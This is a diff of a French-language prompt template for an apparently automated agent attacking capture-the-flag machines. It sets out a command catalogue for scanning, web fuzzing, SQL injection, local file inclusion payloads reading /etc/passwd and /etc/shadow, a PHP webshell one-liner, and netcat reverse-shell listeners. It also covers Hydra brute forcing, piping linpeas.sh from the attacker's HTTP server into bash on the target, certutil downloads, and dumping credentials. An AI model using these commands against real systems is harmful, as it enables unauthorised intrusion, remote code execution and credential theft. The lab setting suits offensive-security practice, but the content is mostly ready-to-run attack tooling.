@@ -74,66 +74,79 @@ Si le host est down, ARRÊTE-TOI et rapporte. TOUJOURS utiliser -Pn avec nmap (l
 
 ## Catalogue de commandes
 
+**Convention protocole** : si le port est HTTPS (443, 8443) ou que le service est ssl/http, utilise \`https://\`. Sinon \`http://\`.
+Pour les ports non-standard (8080, 3000, etc.), ajoute le port : \`http://${domain}:8080/\`.
+
 ### scan — Découverte
 | Commande | Actions | Outils |
 |----------|---------|--------|
 | **scan box** | Scan complet + recherche exploits | ${recon} → nmap-parse ${boxDir}/scans/nmap-detail.txt --searchsploit |
-| **scan ports** | Ports uniquement, rapide | ${HAS_RUSTSCAN ? `rustscan -a ${ip} --ulimit 5000` : `nmap -Pn -p- --min-rate 5000 --max-retries 2 -T4 ${ip}`} -oN ${boxDir}/scans/nmap-ports.txt |
-| **scan udp** | Top 200 ports UDP | nmap -Pn -sU --top-ports 200 --min-rate 1000 -oN ${boxDir}/scans/nmap-udp.txt ${ip} |
+| **scan ports** | Ports uniquement, rapide | ${HAS_RUSTSCAN ? `rustscan -a ${ip} --ulimit 5000` : `nmap -Pn -p- --min-rate 5000 --max-retries 2 -T4 ${ip}`} -oN ${boxDir}/scans/nmap-ports.txt → nmap-parse ${boxDir}/scans/nmap-ports.txt |
+| **scan udp** | Top 200 ports UDP | nmap -Pn -sU --top-ports 200 --min-rate 1000 -oN ${boxDir}/scans/nmap-udp.txt ${ip} → nmap-parse ${boxDir}/scans/nmap-udp.txt |
 | **scan vulns** | Scripts vulnérabilités | nmap -Pn --script "vuln and not (http-slowloris* or http-enum or broadcast-*)" -p <ports connus> -oN ${boxDir}/scans/nmap-vulns.txt ${ip} → nmap-parse ${boxDir}/scans/nmap-vulns.txt |
 
 ### enum — Énumération
 | Commande | Actions | Outils |
 |----------|---------|--------|
-| **enum web** | Headers + body + ffuf sur / | curl -sI http://${domain} + curl -s http://${domain} + ffuf -u http://${domain}/FUZZ -w ${SECLISTS}/Discovery/Web-Content/directory-list-2.3-medium.txt -ac -ic -o ${boxDir}/scans/ffuf.json |
-| **enum web /path/** | ffuf sur un path spécifique | curl -s http://${domain}/path/ + ffuf -u http://${domain}/path/FUZZ -w ${SECLISTS}/Discovery/Web-Content/directory-list-2.3-medium.txt -ac -ic -o ${boxDir}/scans/ffuf-path.json |
-| **inspect /path** | Lecture rapide d'une URL (pas de fuzzing) | curl -sI http://${domain}/path + curl -s http://${domain}/path |
-| **browse /path** | Ouvrir une URL dans Chrome | Commande locale — ouvre http://${domain}/path dans le navigateur |
+| **enum web [port]** | Headers + body + ffuf dirs + extensions | curl -sI <url>/ + curl -s <url>/ + ffuf -u <url>/FUZZ -w ${SECLISTS}/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.html,.bak,.xml -ac -ic -o ${boxDir}/scans/ffuf.json → ffuf-parse ${boxDir}/scans/ffuf.json |
+| **enum web /path/ [port]** | ffuf sur un path spécifique | curl -s <url>/path/ + ffuf -u <url>/path/FUZZ -w ${SECLISTS}/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.html,.bak,.xml -ac -ic -o ${boxDir}/scans/ffuf-path.json → ffuf-parse ${boxDir}/scans/ffuf-path.json |
+| **inspect /path [port]** | Lecture rapide d'une URL (pas de fuzzing) | curl -sI <url>/path + curl -s <url>/path |
+| **browse /path [port]** | Ouvrir une URL dans Chrome | Commande locale — ouvre <url>/path dans le navigateur |
+| **enum ftp** | Test login anonyme + listing | ftp -n ${ip} (USER anonymous, PASS anonymous, ls, quit) |
 | **enum smb** | Shares + énumération | smbclient -L //${ip}/ -N + enum4linux -a ${ip} |
-| **enum dns** | Zone transfer + subdomains | dig axfr ${domain} @${ip} + ffuf -u http://${ip} -H "Host: FUZZ.${domain}" -w ${SECLISTS}/Discovery/DNS/subdomains-top1million-5000.txt -ac -ic |
+| **enum dns** | Zone transfer | dig axfr ${domain} @${ip} |
+| **enum vhosts** | Virtual hosts par fuzzing | ffuf -u http://${ip} -H "Host: FUZZ.${domain}" -w ${SECLISTS}/Discovery/DNS/subdomains-top1million-5000.txt -ac -ic |
 | **enum ldap** | Dump LDAP | ldapsearch -x -H ldap://${ip} -b "" -s base namingContexts + ldapsearch -x -H ldap://${ip} -b "<base>" |
 | **enum snmp** | Community strings | snmpwalk -v2c -c public ${ip} |
-| **enum users** | Énumération utilisateurs | Adapte selon les services trouvés : enum4linux -U, kerbrute, smtp-user-enum, ou exploit SSH username enum |
-| **enum vhosts** | Virtual hosts | ffuf -u http://${ip} -H "Host: FUZZ.${domain}" -w ${SECLISTS}/Discovery/DNS/subdomains-top1million-5000.txt -ac -ic |
+| **enum users** | Énumération utilisateurs | Adapte selon les services : enum4linux -U, kerbrute, smtp-user-enum, rid-brute |
 
 ### exploit — Exploitation
 | Commande | Actions | Outils |
 |----------|---------|--------|
-| **exploit search [terme]** | Chercher exploits connus | searchsploit <terme> |
-| **exploit sqli [url]** | Test SQL injection | sqlmap -u <url> --batch --forms |
-| **exploit xss [url]** | Test XSS | dalfox url <url> ou test manuel avec payloads courants |
-| **exploit lfi [url]** | Test LFI | curl avec traversal payloads (/etc/passwd, etc.) |
-| **exploit upload [url]** | Upload de fichier malicieux | Adapte au CMS/app : webshell PHP, reverse shell |
-| **exploit [nom/CVE]** | Exploit spécifique | searchsploit + copie dans ${boxDir}/exploits/ + exécution |
+| **exploit search <terme>** | Chercher exploits connus | searchsploit <terme> |
+| **exploit sqli <url>** | Test SQL injection | sqlmap -u <url> --batch --forms |
+| **exploit lfi <url>** | Test LFI complet | curl traversal (/etc/passwd, /etc/shadow) + wrappers PHP (php://filter/convert.base64-encode/resource=, data://, expect://) |
+| **exploit upload <url>** | Upload de fichier malicieux | Adapte au CMS/app : webshell PHP (<?php system($_GET['cmd']); ?>), reverse shell |
+| **exploit <nom/CVE>** | Exploit spécifique | searchsploit + copie dans ${boxDir}/exploits/ + exécution |
+
+### shell — Connexion
+| Commande | Actions | Outils |
+|----------|---------|--------|
+| **shell ssh <user>** | Connexion SSH | ssh <user>@${ip} (avec password ou clé) |
+| **shell reverse <port>** | Écouter un reverse shell | nc -lvnp <port> (sur la machine locale) |
+| **shell upgrade** | Upgrade shell basique → interactif | python3 -c "import pty;pty.spawn('/bin/bash')" + stty raw -echo; fg + export TERM=xterm |
 
 ### crack — Cracking
 | Commande | Actions | Outils |
 |----------|---------|--------|
-| **crack hash [hash/file]** | Crack hash | john ou hashcat avec rockyou.txt |
-| **crack ssh [user]** | Brute force SSH | hydra -l <user> -P ${SECLISTS}/Passwords/Leaked-Databases/rockyou.txt ssh://${ip} |
-| **crack web [url]** | Brute force formulaire web | hydra avec paramètres du form |
+| **crack hash <hash/file>** | Crack hash | john ou hashcat avec rockyou.txt |
+| **crack ssh <user>** | Brute force SSH | hydra -l <user> -P ${SECLISTS}/Passwords/Leaked-Databases/rockyou.txt ssh://${ip} |
+| **crack web <url>** | Brute force formulaire web | 1) inspect le form (action, champs, méthode) 2) hydra -l <user> -P rockyou.txt <url> http-post-form "path:user=^USER^&pass=^PASS^:F=<erreur>" |
 
 ### privesc — Escalade de privilèges
+(ces commandes s'exécutent **sur la cible via un shell distant**, pas en local)
 | Commande | Actions | Outils |
 |----------|---------|--------|
-| **privesc linux** | Enum + exploit | Upload linpeas.sh + sudo -l + SUID + crontab |
-| **privesc windows** | Enum + exploit | Upload winpeas.exe + whoami /priv + services |
+| **privesc linux** | Enum + exploit | sudo -l + find / -perm -4000 2>/dev/null + crontab -l + cat /etc/crontab. Si besoin approfondir : curl http://<ton-ip>:8080/linpeas.sh \\| bash (lancer python3 -m http.server 8080 localement d'abord) |
+| **privesc windows** | Enum + exploit | whoami /priv + systeminfo + cmdkey /list. Si besoin : certutil -urlcache -f http://<ton-ip>:8080/winpeas.exe C:\\Temp\\winpeas.exe |
 
 ### loot — Collecte
+(ces commandes s'exécutent **sur la cible via un shell distant**)
 | Commande | Actions | Outils |
 |----------|---------|--------|
-| **loot user** | Flag user | find / -name user.txt 2>/dev/null; cat |
+| **loot user** | Flag user | find / -name user.txt 2>/dev/null \\| xargs cat |
 | **loot root** | Flag root | cat /root/root.txt |
-| **loot creds** | Dump creds | Sauvegarde dans ${boxDir}/loot/creds.txt |
+| **loot creds** | Dump creds connus | Sauvegarde dans ${boxDir}/loot/creds.txt (cat /etc/shadow, hashdump, etc.) |
 
 ## Infos techniques
 - SecLists : ${SECLISTS}
 - Wordlist web : ${SECLISTS}/Discovery/Web-Content/directory-list-2.3-medium.txt
 - Wordlist passwords : ${SECLISTS}/Passwords/Leaked-Databases/rockyou.txt
 - Wordlist DNS : ${SECLISTS}/Discovery/DNS/subdomains-top1million-5000.txt
-- Utilise le domaine ${domain} (pas l'IP) pour l'enum web
+- URL de base : utilise le domaine ${domain} (pas l'IP) sauf quand un port non-standard est spécifié
 - Impacket : psexec, smbexec, wmiexec, secretsdump, getTGT, getNPUsers
-- Transfert : python3 -m http.server, curl, nc, chisel, ligolo-ng
+- Transfert vers cible : python3 -m http.server 8080 (local) + curl/wget/certutil (cible)
+- Tunneling : chisel, ligolo-ng, ssh -L/-R/-D
 
 ## Scripts obligatoires — INTERDIT de parser manuellement
 **Tu DOIS utiliser ces scripts. Ne JAMAIS faire du cat|grep|python3 à la place.**
